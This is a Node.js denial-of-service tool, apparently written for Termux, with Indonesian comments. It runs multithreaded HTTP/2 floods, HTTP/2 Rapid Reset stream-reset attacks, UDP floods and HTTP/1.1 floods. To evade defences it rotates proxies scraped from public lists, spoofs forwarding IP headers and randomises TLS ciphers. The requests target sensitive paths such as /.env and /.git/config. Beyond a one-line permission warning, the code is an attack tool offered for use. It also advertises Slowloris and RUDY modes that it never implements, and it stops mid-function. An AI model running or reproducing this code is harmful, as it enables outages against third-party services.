#!/usr/bin/env node
/**
 * =====================================================================
 *                         🔱 0711 – TERMUX EDITION 🔱
 *                     Optimized for Limited Resources
 *   HTTP/2 Rapid Reset, Slowloris, RUDY, Proxy Rotation, Dashboard
 * =====================================================================
 * 
 * USAGE (Termux):
 *   node 0711.js --target example.com --workers 5 --duration 30
 * 
 * ⚠️  WARNING: Use only on systems you own or have explicit permission.
 * =====================================================================
 */

// ===== Impor Modul =====
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const os = require('os');
const crypto = require('crypto');
const url = require('url');
const fs = require('fs');
const path = require('path');
const dns = require('dns').promises;
const http = require('http');
const https = require('https');
const net = require('net');
const tls = require('tls');
const readline = require('readline');

// ===== Konfigurasi Default =====
const CONFIG = {
    target: 'example.com',
    targets: [],
    ports: [443, 80],
    workersPerPort: 5,         // Default rendah untuk Termux
    duration: 120,
    attackType: 'https',
    attackMode: 'normal',
    method: 'GET',
    proxyAuto: false,
    proxyFile: null,
    proxySources: [
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
        'https://www.proxy-list.download/api/v1/get?type=http',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
        'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
        'https://proxylist.rip/proxy/http/format/txt/',
    ],
    userAgentsFile: null,
    payloadsFile: null,
    outputDir: './reports',
    dashboard: false,
    dashboardPort: 8080,
    logFile: '0711.log',
    verbose: false,
    maxConsecutiveFailures: 3,
    maxErrorsPerWorker: 200,    // Turunkan agar worker berhenti lebih cepat
    backoffBase: 1000,
    maxBackoff: 30000,
    customHeaders: {},
    sslVerify: false,
    payloads: [
        '/wp-admin', '/wp-login.php', '/wp-json/wp/v2/users', '/xmlrpc.php',
        '/api/v1/users', '/api/v1/login', '/api/v1/search',
        '/index.php', '/admin', '/login', '/dashboard', '/panel',
        '/config.php', '/.env', '/.git/config', '/backup.sql',
        '/phpinfo.php', '/server-status', '/.htaccess'
    ],
};

// ===== Utility =====
const logger = {
    _target: '',
    info: (msg) => console.log(`\x1b[36m[INFO]\x1b[0m ${msg}`),
    success: (msg) => console.log(`\x1b[32m[SUCCESS]\x1b[0m ${msg}`),
    warn: (msg) => console.log(`\x1b[33m[WARN]\x1b[0m ${msg}`),
    error: (msg) => console.log(`\x1b[31m[ERROR]\x1b[0m ${msg}`),
    debug: (msg) => { if (global.verbose) console.log(`\x1b[90m[DEBUG]\x1b[0m ${msg}`); },
    attack: (msg) => {
        const target = logger._target || 'UNKNOWN';
        console.log(`\x1b[35m[0711 ATTACK]\x1b[0m \x1b[33m(${target})\x1b[0m ${msg}`);
    }
};

class Spinner {
    constructor(text) {
        this.text = text;
        this.frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
        this.interval = null;
        this.current = 0;
    }
    start() {
        if (this.interval) return;
        this.interval = setInterval(() => {
            const frame = this.frames[this.current % this.frames.length];
            readline.cursorTo(process.stdout, 0);
            process.stdout.write(`\x1b[36m${frame}\x1b[0m ${this.text}`);
            this.current++;
        }, 80);
    }
    stop() {
        if (this.interval) {
            clearInterval(this.interval);
            this.interval = null;
            readline.cursorTo(process.stdout, 0);
            readline.clearLine(process.stdout, 0);
            process.stdout.write(`\x1b[32m✓\x1b[0m ${this.text}\n`);
        }
    }
}

// ===== Parser & Normalisasi =====
function parseArgs() {
    const args = process.argv.slice(2);
    const parsed = {};
    for (let i = 0; i < args.length; i++) {
        let arg = args[i];
        let key, value;
        // Handle --key=value
        if (arg.startsWith('--') && arg.includes('=')) {
            [key, value] = arg.slice(2).split('=', 2);
            parsed[key] = value;
            continue;
        }
        if (arg.startsWith('--')) {
            key = arg.slice(2);
            const next = args[i+1];
            if (next && !next.startsWith('--')) {
                value = next;
                i++;
            } else {
                value = true;
            }
            parsed[key] = value;
        }
    }
    return parsed;
}

function normalizeTarget(input) {
    if (!input) return input;
    let cleaned = input.trim();
    cleaned = cleaned.replace(/^https?:\/\//, '');
    cleaned = cleaned.replace(/\/$/, '');
    // Handle IPv6 [2001:db8::1]:443
    if (cleaned.startsWith('[') && cleaned.includes(']')) {
        const match = cleaned.match(/^\[([^\]]+)\](?::(\d+))?$/);
        if (match) {
            return match[1]; // return IPv6 tanpa port
        }
    }
    // IPv4 / domain
    cleaned = cleaned.split(':')[0];
    return cleaned;
}

// ===== Fungsi Utama =====
async function main() {
    const cmdArgs = parseArgs();
    if (cmdArgs['example-config'] || cmdArgs['e']) {
        console.log(JSON.stringify(CONFIG, null, 2));
        return;
    }

    let config = { ...CONFIG };
    if (cmdArgs.config) {
        try {
            const fileConfig = JSON.parse(fs.readFileSync(cmdArgs.config, 'utf8'));
            config = { ...config, ...fileConfig };
        } catch (e) {
            logger.error(`Gagal load config file: ${e.message}`);
            process.exit(1);
        }
    }
    for (const [key, val] of Object.entries(cmdArgs)) {
        if (val !== undefined) config[key] = val;
    }

    // Normalisasi target
    if (config.target) {
        const original = config.target;
        config.target = normalizeTarget(config.target);
        if (original !== config.target) logger.debug(`Target normalized: ${original} -> ${config.target}`);
    }
    if (config.targets) {
        if (typeof config.targets === 'string') {
            if (fs.existsSync(config.targets)) {
                config.targets = fs.readFileSync(config.targets, 'utf8')
                    .split('\n')
                    .map(line => line.trim())
                    .filter(Boolean)
                    .map(normalizeTarget);
            } else {
                config.targets = [normalizeTarget(config.targets)];
            }
        } else if (Array.isArray(config.targets)) {
            config.targets = config.targets.map(normalizeTarget).filter(Boolean);
        }
    }
    if (!config.targets || config.targets.length === 0) {
        if (config.target) {
            config.targets = [config.target];
        } else {
            logger.error('Tidak ada target! Gunakan --target, --targets, atau --config');
            process.exit(1);
        }
    }

    logger._target = config.targets[0];

    if (typeof config.ports === 'string') {
        config.ports = config.ports.split(',').map(p => parseInt(p.trim()));
    } else if (!Array.isArray(config.ports)) {
        config.ports = [config.ports];
    }

    if (cmdArgs.workers) config.workersPerPort = parseInt(cmdArgs.workers);

    // CAP total worker untuk Termux (maks 4x CPU cores)
    const maxAllowedWorkers = Math.max(4, os.cpus().length * 2);
    let totalWorkers = config.targets.length * config.ports.length * config.workersPerPort;
    if (totalWorkers > maxAllowedWorkers) {
        logger.warn(`Total workers (${totalWorkers}) melebihi batas (${maxAllowedWorkers}). Dikurangi ke ${maxAllowedWorkers}.`);
        // Turunkan workersPerPort proporsional
        const targetPortCount = config.targets.length * config.ports.length;
        if (targetPortCount > 0) {
            config.workersPerPort = Math.floor(maxAllowedWorkers / targetPortCount);
            if (config.workersPerPort < 1) config.workersPerPort = 1;
            totalWorkers = targetPortCount * config.workersPerPort;
            logger.info(`Workers disesuaikan menjadi ${config.workersPerPort} per port (total ${totalWorkers}).`);
        }
    }

    config.durationMs = config.duration > 0 ? config.duration * 1000 : null;

    // Load user agents
    let userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    ];
    if (config.userAgentsFile && fs.existsSync(config.userAgentsFile)) {
        try {
            const data = fs.readFileSync(config.userAgentsFile, 'utf8');
            userAgents = data.split('\n').map(l => l.trim()).filter(Boolean);
        } catch (e) {}
    }

    let payloadTemplates = config.payloads || [];
    if (config.payloadsFile && fs.existsSync(config.payloadsFile)) {
        try {
            const data = fs.readFileSync(config.payloadsFile, 'utf8');
            payloadTemplates = data.split('\n').map(l => l.trim()).filter(Boolean);
        } catch (e) {}
    }

    // ===== Proxy Manager (Parallel fetch) =====
    let proxyList = [];
    // Fallback proxies dihapus karena 99% mati, lebih baik kosong

    async function fetchProxies() {
        if (!config.proxyAuto && !config.proxyFile) return;
        const spinner = new Spinner('Fetching proxies...');
        spinner.start();
        const all = new Set();

        if (config.proxyFile && fs.existsSync(config.proxyFile)) {
            const data = fs.readFileSync(config.proxyFile, 'utf8');
            data.split('\n').forEach(line => {
                const l = line.trim();
                if (l && !l.startsWith('#')) all.add(l);
            });
        }

        if (config.proxyAuto) {
            const sources = config.proxySources || CONFIG.proxySources;
            // Parallel fetch
            const results = await Promise.allSettled(
                sources.map(async (src) => {
                    try {
                        const urlObj = new URL(src);
                        const protocol = urlObj.protocol === 'https:' ? https : http;
                        const rawData = await new Promise((resolve, reject) => {
                            const req = protocol.get(urlObj, (res) => {
                                let data = '';
                                res.on('data', chunk => data += chunk);
                                res.on('end', () => resolve(data));
                                res.on('error', reject);
                            });
                            req.setTimeout(8000, () => {
                                req.destroy();
                                reject(new Error('Timeout'));
                            });
                            req.on('error', reject);
                        });
                        const lines = rawData.split('\n');
                        const proxies = lines
                            .map(l => l.trim())
                            .filter(l => l && l.includes(':') && !l.startsWith('[') && !l.startsWith('#'))
                            .map(l => {
                                const [host, port] = l.split(':');
                                if (net.isIP(host) && port > 0 && port < 65536) {
                                    return l;
                                }
                                return null;
                            })
                            .filter(Boolean);
                        if (proxies.length > 0) all.add(...proxies);
                        if (config.verbose) logger.debug(`Fetched ${proxies.length} from ${src}`);
                    } catch (e) {
                        if (config.verbose) logger.debug(`Failed ${src}: ${e.message}`);
                    }
                })
            );
        }

        proxyList = Array.from(all);
        spinner.stop();
        if (proxyList.length > 0) {
            logger.success(`${proxyList.length} proxies ready.`);
        } else {
            logger.warn('No proxies available. Continuing without proxy.');
        }
    }

    // ===== Attack Engine =====
    class AttackEngine {
        constructor(config, userAgents, payloadTemplates, proxyList) {
            this.config = config;
            this.userAgents = userAgents;
            this.payloadTemplates = payloadTemplates;
            this.proxyList = proxyList;
            this.stats = {
                total: 0,
                success: 0,
                failed: 0,
                serverErrors: 0,
                startTime: Date.now(),
                activeWorkers: 0,
            };
            this.workers = [];
            this.isStopping = false;
            this.workerCounter = 0;
        }

        start(targets) {
            const totalWorkers = targets.length * this.config.ports.length * this.config.workersPerPort;
            logger.info(`Targets: ${targets.map(t => t.host).join(', ')}`);
            logger.info(`Ports: ${this.config.ports.join(', ')}`);
            logger.info(`Workers: ${this.config.workersPerPort} per port per target (total ${totalWorkers})`);
            logger.info(`Attack type: ${this.config.attackType}, Mode: ${this.config.attackMode}, Method: ${this.config.method}`);
            logger.info(`Duration: ${this.config.duration > 0 ? this.config.duration + 's' : 'Unlimited'}`);
            logger.info(`Proxy: ${this.proxyList.length > 0 ? 'Enabled ('+this.proxyList.length+' proxies)' : 'Disabled'}`);
            logger.info('');

            logger.attack(`ELMY0711 Attack is started`);

            const workerPromises = [];
            for (const target of targets) {
                for (const port of this.config.ports) {
                    for (let i = 0; i < this.config.workersPerPort; i++) {
                        const workerId = this.workerCounter++;
                        const workerData = {
                            targetIP: target.ip,
                            port: port,
                            attackType: this.config.attackType,
                            attackMode: this.config.attackMode,
                            durationMs: this.config.durationMs,
                            httpMethod: this.config.method,
                            workerId: `${target.host}-${port}-${workerId}`,
                            USER_AGENTS: this.userAgents,
                            CHARSET: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
                            proxyList: this.proxyList,
                            payloadTemplates: this.payloadTemplates,
                            maxConsecutiveFailures: this.config.maxConsecutiveFailures || 3,
                            maxErrorsPerWorker: this.config.maxErrorsPerWorker || 200,
                            backoffBase: this.config.backoffBase || 1000,
                            maxBackoff: this.config.maxBackoff || 30000,
                            verbose: this.config.verbose || false,
                            customHeaders: this.config.customHeaders || {},
                        };

                        const worker = new Worker(WORKER_CODE, { eval: true, workerData });
                        this.workers.push(worker);

                        logger.attack(`Attack Thread ${workerId} Started`);

                        const promise = new Promise((resolve, reject) => {
                            worker.on('message', (msg) => {
                                if (msg.type === 'stats') {
                                    this.stats.total += msg.sent || 0;
                                    this.stats.failed += msg.errors || 0;
                                    this.stats.serverErrors += msg.serverErrors || 0;
                                    this.stats.activeWorkers = msg.active || 0;
                                } else if (msg.type === 'done') {
                                    resolve({ workerId: msg.workerId, status: 'done' });
                                } else if (msg.type === 'log') {
                                    logger.attack(msg.message);
                                }
                            });
                            worker.on('error', (err) => {
                                this.stats.failed++;
                                logger.error(`Worker ${workerData.workerId} error: ${err.message}`);
                                reject({ workerId: workerData.workerId, status: 'error', error: err });
                            });
                            worker.on('exit', (code) => {
                                if (code !== 0 && !this.isStopping) {
                                    this.stats.failed++;
                                    logger.error(`Worker ${workerData.workerId} exited with code ${code}`);
                                    reject({ workerId: workerData.workerId, status: 'exit', code });
                                } else if (code === 0 && !this.isStopping) {
                                    resolve({ workerId: workerData.workerId, status: 'done' });
                                }
                            });
                        });
                        workerPromises.push(promise);
                    }
                }
            }

            // Stats interval 500ms untuk mengurangi IPC
            const statsInterval = setInterval(() => {
                const elapsed = (Date.now() - this.stats.startTime) / 1000;
                const rate = this.stats.total / (elapsed || 1);
                const success = Math.max(0, this.stats.total - this.stats.failed - this.stats.serverErrors);
                const successRate = this.stats.total > 0 ? ((success / this.stats.total) * 100).toFixed(1) : 0;
                console.log(`\x1b[36m[STATS]\x1b[0m Total: ${this.stats.total} | Success: ${success} | Failed: ${this.stats.failed} | ServerErr: ${this.stats.serverErrors} | Active: ${this.stats.activeWorkers} | Rate: ${rate.toFixed(1)} req/s | SuccessRate: ${successRate}% | Elapsed: ${elapsed.toFixed(1)}s`);
            }, 500);

            const sigIntHandler = async () => {
                if (this.isStopping) return;
                this.isStopping = true;
                clearInterval(statsInterval);
                logger.warn('Stopping all workers...');
                for (const w of this.workers) {
                    try { w.postMessage({ type: 'stop' }); } catch (e) {}
                }
                await Promise.allSettled(workerPromises.map(p => Promise.race([p, new Promise((_, rej) => setTimeout(() => rej('timeout'), 5000))])));
                logger.success('All workers stopped.');
                this.generateReport();
                process.exit(0);
            };
            process.on('SIGINT', sigIntHandler);

            Promise.allSettled(workerPromises)
                .then(() => {
                    clearInterval(statsInterval);
                    logger.success('All workers finished.');
                    this.generateReport();
                    process.exit(0);
                })
                .catch(() => {});
        }

        generateReport() {
            const elapsed = (Date.now() - this.stats.startTime) / 1000;
            const success = Math.max(0, this.stats.total - this.stats.failed - this.stats.serverErrors);
            const successRate = this.stats.total > 0 ? ((success / this.stats.total) * 100).toFixed(2) : 0;
            const report = {
                timestamp: new Date().toISOString(),
                targets: this.config.targets,
                ports: this.config.ports,
                workers: this.config.workersPerPort,
                attackMode: this.config.attackMode,
                duration: elapsed,
                totalRequests: this.stats.total,
                success: success,
                errors: this.stats.failed,
                serverErrors: this.stats.serverErrors,
                successRate: successRate + '%',
                proxyUsed: this.proxyList.length,
                attackType: this.config.attackType,
                method: this.config.method,
            };
            const outputDir = this.config.outputDir || './reports';
            if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir, { recursive: true });
            const filename = path.join(outputDir, `report_${Date.now()}.json`);
            fs.writeFileSync(filename, JSON.stringify(report, null, 2));
            logger.success(`Report saved to ${filename}`);
            console.log('\x1b[36m══════════════════════════════════════════════════\x1b[0m');
            console.log('\x1b[36m╔══════════════════════════════════════════════════╗');
            console.log('\x1b[36m║              ATTACK FINISHED                    ║');
            console.log('\x1b[36m╚══════════════════════════════════════════════════╝');
            console.log(`Target(s)       : ${this.config.targets.join(', ')}`);
            console.log(`Attack Mode     : ${this.config.attackMode}`);
            console.log(`Total Requests  : ${this.stats.total}`);
            console.log(`Success (2xx-3xx): ${success}`);
            console.log(`Errors          : ${this.stats.failed}`);
            console.log(`Server Errors   : ${this.stats.serverErrors}`);
            console.log(`Success Rate    : ${successRate}%`);
            console.log(`Duration        : ${elapsed.toFixed(2)}s`);
            console.log(`Proxy Used      : ${this.proxyList.length > 0 ? 'Yes ('+this.proxyList.length+')' : 'No'}`);
            console.log('\x1b[36m══════════════════════════════════════════════════\x1b[0m');
            if (this.config.logFile) {
                fs.appendFileSync(this.config.logFile, `[${new Date().toISOString()}] ${JSON.stringify(report)}\n`);
            }
        }
    }

    // ===== Worker Code (FIXED for Termux) =====
    const WORKER_CODE = `
(async () => {
const { parentPort, workerData } = require('worker_threads');
const net = require('net');
const tls = require('tls');
const crypto = require('crypto');
const dgram = require('dgram');
const http2 = require('http2');
const http = require('http');

const {
    targetIP, port, attackType, attackMode, durationMs, httpMethod,
    workerId, USER_AGENTS, CHARSET, proxyList, payloadTemplates,
    maxConsecutiveFailures, maxErrorsPerWorker, backoffBase, maxBackoff, verbose, customHeaders,
} = workerData;

let sent = 0, active = 0, errors = 0, serverErrors = 0;
let isStopping = false;
let consecutiveFailures = 0;
let socket = null;           // proxy socket
let tlsConn = null;          // TLS connection
let http2Client = null;
let durationTimer = null;
let currentProxyIndex = 0;

const localUA = USER_AGENTS || ['HydraWorker'];
const charset = CHARSET || 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

function rand(n) { return Math.floor(Math.random() * n); }
function randStr(len) { let s=''; for(let i=0;i<len;i++) s+=charset[rand(charset.length)]; return s; }
function randUA() { return localUA[rand(localUA.length)]; }
function randIP() { return \`\${rand(255)+1}.\${rand(255)+1}.\${rand(255)+1}.\${rand(255)+1}\`; }
function randPayload() { return payloadTemplates && payloadTemplates.length ? payloadTemplates[rand(payloadTemplates.length)] : '/'; }
function sleep(ms) { return new Promise(res => setTimeout(res, ms)); }
function getProxy() {
    if (!proxyList || proxyList.length === 0) return null;
    const p = proxyList[currentProxyIndex % proxyList.length];
    currentProxyIndex++;
    return p;
}

// Cipher list (untuk fingerprint samar)
const CIPHER_LIST = [
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES128-SHA256',
    'ECDHE-ECDSA-AES128-SHA256',
    'ECDHE-RSA-AES256-SHA384',
    'ECDHE-ECDSA-AES256-SHA384',
    'AES128-GCM-SHA256',
    'AES256-GCM-SHA384',
    'AES128-SHA256',
    'AES256-SHA256',
];
function randomCiphers() {
    const shuffled = CIPHER_LIST.sort(() => Math.random() - 0.5);
    return shuffled.slice(0, Math.min(5 + rand(5), shuffled.length)).join(':');
}

function sendStats(extra = {}) {
    parentPort.postMessage({
        type: 'stats',
        sent: sent,
        active: active,
        errors: errors,
        serverErrors: serverErrors,
        ...extra,
    });
}
function sendLog(message) {
    parentPort.postMessage({ type: 'log', message: message });
}
function cleanup(reason) {
    if (isStopping) return;
    isStopping = true;
    if (durationTimer) { clearTimeout(durationTimer); durationTimer = null; }
    // Tutup semua koneksi
    if (http2Client && !http2Client.destroyed) {
        http2Client.destroy();
        http2Client = null;
    }
    if (tlsConn && !tlsConn.destroyed) {
        tlsConn.destroy();
        tlsConn = null;
    }
    if (socket && !socket.destroyed) {
        socket.destroy();
        socket = null;
    }
    active = 0;
    sendStats({ workerId, reason });
    parentPort.postMessage({ type: 'done', workerId });
}

// Timer durasi
if (durationMs && durationMs > 0) {
    durationTimer = setTimeout(() => {
        cleanup('Duration limit reached');
    }, durationMs);
}

// --- HTTP/2 Normal Attack ---
async function http2NormalAttack() {
    let statsCounter = 0;
    while (!isStopping) {
        sent++;
        statsCounter++;
        if (errors > maxErrorsPerWorker) {
            cleanup(\`Too many errors (>\${maxErrorsPerWorker})\`);
            return;
        }
        let errorLogged = false;
        try {
            const proxy = getProxy();
            // Build connection
            let proxySocket = null;
            if (proxy) {
                const [proxyHost, proxyPort] = proxy.split(':');
                proxySocket = net.connect(proxyPort, proxyHost);
                await new Promise((resolve, reject) => {
                    proxySocket.once('data', (data) => {
                        if (data.toString().includes('200 Connection established')) {
                            resolve();
                        } else {
                            reject(new Error('Proxy CONNECT failed'));
                        }
                    });
                    proxySocket.once('error', reject);
                    setTimeout(() => reject(new Error('Proxy timeout')), 5000);
                });
                tlsConn = tls.connect({
                    host: targetIP,
                    port: 443,
                    socket: proxySocket,
                    rejectUnauthorized: false,
                    ciphers: randomCiphers(),
                });
            } else {
                tlsConn = tls.connect({
                    host: targetIP,
                    port: 443,
                    rejectUnauthorized: false,
                    ciphers: randomCiphers(),
                });
            }
            active = 1;
            // Kirim stats tiap 10 request untuk kurangi IPC
            if (statsCounter % 10 === 0) sendStats();

            http2Client = http2.connect(\`https://\${targetIP}\`, { createConnection: () => tlsConn });
            http2Client.on('error', (err) => {
                if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
                http2Client.destroy();
            });

            const payload = randPayload();
            const method = httpMethod || 'GET';
            const headers = {
                ':method': method,
                ':path': payload + '?' + randStr(12) + '=' + randStr(8),
                ':scheme': 'https',
                ':authority': targetIP,
                'user-agent': randUA(),
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'x-forwarded-for': randIP(),
                'x-real-ip': randIP(),
                'referer': 'https://' + randStr(8) + '.com/',
            };
            if (customHeaders) Object.assign(headers, customHeaders);

            const req = http2Client.request(headers);
            req.on('response', (response) => {
                consecutiveFailures = 0;
                const status = response.headers[':status'] || 0;
                if (status >= 400 && status < 600) serverErrors++;
                sendStats();
                req.destroy();
                http2Client.destroy();
                // Reset koneksi
                if (tlsConn && !tlsConn.destroyed) tlsConn.destroy();
                if (socket && !socket.destroyed) socket.destroy();
                active = 0;
            });
            req.on('error', (err) => {
                if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
                req.destroy();
                http2Client.destroy();
                if (tlsConn && !tlsConn.destroyed) tlsConn.destroy();
                if (socket && !socket.destroyed) socket.destroy();
                active = 0;
            });
            req.end();
            await sleep(10 + rand(20));
        } catch (err) {
            if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
            if (consecutiveFailures >= maxConsecutiveFailures) {
                cleanup(\`Max consecutive failures (\${maxConsecutiveFailures}) reached\`);
                return;
            }
            // Cleanup on error
            if (http2Client && !http2Client.destroyed) http2Client.destroy();
            if (tlsConn && !tlsConn.destroyed) tlsConn.destroy();
            if (socket && !socket.destroyed) socket.destroy();
            active = 0;
            await sleep(2000 + rand(3000));
        }
    }
}

// --- HTTP/2 Rapid Reset (massal) ---
async function http2RapidResetAttack() {
    let statsCounter = 0;
    while (!isStopping) {
        sent++;
        statsCounter++;
        if (errors > maxErrorsPerWorker) {
            cleanup(\`Too many errors (>\${maxErrorsPerWorker})\`);
            return;
        }
        let errorLogged = false;
        try {
            const proxy = getProxy();
            let proxySocket = null;
            if (proxy) {
                const [proxyHost, proxyPort] = proxy.split(':');
                proxySocket = net.connect(proxyPort, proxyHost);
                await new Promise((resolve, reject) => {
                    proxySocket.once('data', (data) => {
                        if (data.toString().includes('200 Connection established')) {
                            resolve();
                        } else {
                            reject(new Error('Proxy CONNECT failed'));
                        }
                    });
                    proxySocket.once('error', reject);
                    setTimeout(() => reject(new Error('Proxy timeout')), 5000);
                });
                tlsConn = tls.connect({
                    host: targetIP,
                    port: 443,
                    socket: proxySocket,
                    rejectUnauthorized: false,
                    ciphers: randomCiphers(),
                });
            } else {
                tlsConn = tls.connect({
                    host: targetIP,
                    port: 443,
                    rejectUnauthorized: false,
                    ciphers: randomCiphers(),
                });
            }
            active = 1;
            if (statsCounter % 10 === 0) sendStats();

            http2Client = http2.connect(\`https://\${targetIP}\`, { createConnection: () => tlsConn });
            http2Client.on('error', (err) => {
                if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
                http2Client.destroy();
            });

            const payload = randPayload();
            const method = httpMethod || 'GET';
            const headers = {
                ':method': method,
                ':path': payload + '?' + randStr(12) + '=' + randStr(8),
                ':scheme': 'https',
                ':authority': targetIP,
                'user-agent': randUA(),
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'x-forwarded-for': randIP(),
                'x-real-ip': randIP(),
                'referer': 'https://' + randStr(8) + '.com/',
            };
            if (customHeaders) Object.assign(headers, customHeaders);

            // Kirim 20 stream sekaligus lalu RST semuanya
            const streams = [];
            for (let i = 0; i < 20; i++) {
                const req = http2Client.request(headers);
                req.on('error', () => {});
                req.end();
                streams.push(req);
            }
            // Langsung RST semua stream
            for (const req of streams) {
                req.destroy();
            }
            // Tutup koneksi setelah reset
            http2Client.destroy();
            if (tlsConn && !tlsConn.destroyed) tlsConn.destroy();
            if (socket && !socket.destroyed) socket.destroy();
            active = 0;
            await sleep(1 + rand(5));
        } catch (err) {
            if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
            if (consecutiveFailures >= maxConsecutiveFailures) {
                cleanup(\`Max consecutive failures (\${maxConsecutiveFailures}) reached\`);
                return;
            }
            if (http2Client && !http2Client.destroyed) http2Client.destroy();
            if (tlsConn && !tlsConn.destroyed) tlsConn.destroy();
            if (socket && !socket.destroyed) socket.destroy();
            active = 0;
            await sleep(100 + rand(300));
        }
    }
}

// --- UDP Attack ---
async function udpAttack() {
    const udpSocket = dgram.createSocket('udp4');
    let errorLogged = false;
    udpSocket.on('error', (err) => {
        if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
    });
    udpSocket.on('message', () => { serverErrors++; sendStats(); });
    const startTime = Date.now();
    let statsCounter = 0;
    while (!isStopping) {
        sent++;
        statsCounter++;
        if (errors > maxErrorsPerWorker) {
            cleanup(\`Too many errors (>\${maxErrorsPerWorker})\`);
            return;
        }
        if (durationMs && Date.now() - startTime > durationMs) break;
        try {
            const payload = Buffer.from(randStr(1400)); // lebih besar
            udpSocket.send(payload, port, targetIP, (err) => {
                if (err) {
                    if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
                } else {
                    if (statsCounter % 10 === 0) sendStats();
                }
            });
            await sleep(1 + rand(10));
        } catch (e) {
            if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
        }
    }
    udpSocket.close();
    cleanup('UDP finished');
}

// --- Timeout monitor ---
let timeoutCounter = 0;
const timeoutInterval = setInterval(() => {
    if (isStopping) { clearInterval(timeoutInterval); return; }
    timeoutCounter++;
    if (timeoutCounter % 2 === 0) sendLog('Request Timed Out');
}, 2000);

parentPort.on('message', (msg) => {
    if (msg.type === 'stop') {
        clearInterval(timeoutInterval);
        cleanup('Received stop');
    }
});

// --- Entry ---
if (attackType === 'udp') {
    await udpAttack();
} else if (attackType === 'https') {
    if (attackMode === 'rapid_reset') {
        await http2RapidResetAttack();
    } else {
        await http2NormalAttack();
    }
} else {
    // HTTP/1.1 fallback (sederhana)
    let statsCounter = 0;
    while (!isStopping) {
        sent++;
        statsCounter++;
        if (errors > maxErrorsPerWorker) break;
        let errorLogged = false;
        try {
            const proxy = getProxy();
            const options = {
                host: targetIP,
                port: port,
                method: httpMethod || 'GET',
                path: randPayload() + '?' + randStr(12),
                headers: {
                    'User-Agent': randUA(),
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'no-cache',
                    'X-Forwarded-For': randIP(),
                    'X-Real-IP': randIP(),
                    'Referer': 'https://' + randStr(8) + '.com/',
                },
                rejectUnauthorized: false,
            };
            if (customHeaders) Object.assign(options.headers, customHeaders);
            const req = http.request(options);
            req.on('response', (response) => {
                consecutiveFailures = 0;
                const status = response.statusCode || 0;
                if (status >= 400 && status < 600) serverErrors++;
                if (statsCounter % 10 === 0) sendStats();
                req.destroy();
            });
            req.on('error', (err) => {
                if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
            });
            req.end();
            await sleep(10 + rand(20));
        } catch (err) {
            if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
            if (consecutiveFailures >= maxConsecutiveFailures) {
                cleanup('Max failures reached');
                return;
            }
            await sleep(2000 + rand(3000));
        }
    }
}
})();
`;

    // ===== Eksekusi =====
    logger.info('Initializing 0711 Termux Edition...');

    // Cek dashboard dependencies
    if (config.dashboard) {
        try {
            require.resolve('express');
            require.resolve('cors');
        } catch (e) {
            logger.error('Dashboard dependencies not installed. Run: npm install express cors');
            logger.warn('Dashboard disabled.');
            config.dashboard = false;
        }
    }

    if (config.proxyAuto || config.proxyFile) {
        await fetchProxies();
    }

    const targets = config.targets;
    let resolvedTargets = [];
    const spinner = new Spinner('Resolving targets...');
    spinner.start();
    for (const t of targets) {
        try {
            const ips = await dns.lookup(t, { all: true });
            const ip = ips.find(entry => entry.family === 4)?.address || t;
            resolvedTargets.push({ host: t, ip });
        } catch (e) {
            logger.warn(`Cannot resolve ${t}, using as-is.`);
            resolvedTargets.push({ host: t, ip: t });
        }
    }
    spinner.stop();
    logger.success(`Targets resolved: ${resolvedTargets.map(t => t.host).join(', ')}`);

    if (config.dashboard) {
        try {
            const express = require('express');
            const cors = require('cors');
            const app = express();
            app.use(cors());
            const engine = new AttackEngine(config, userAgents, payloadTemplates, proxyList);
            app.get('/stats', (req, res) => {
                res.json({
                    totalSent: engine.stats.total,
                    totalErrors: engine.stats.failed,
                    serverErrors: engine.stats.serverErrors,
                    activeWorkers: engine.stats.activeWorkers,
                    uptime: (Date.now() - engine.stats.startTime) / 1000,
                    targets: resolvedTargets.map(t => ({ host: t.host, status: 'running' })),
                });
            });
            app.listen(config.dashboardPort, () => {
                logger.success(`Dashboard running at http://localhost:${config.dashboardPort}/stats`);
            });
        } catch (e) {
            logger.warn('Dashboard failed to start.');
        }
    }

    const engine = new AttackEngine(config, userAgents, payloadTemplates, proxyList);
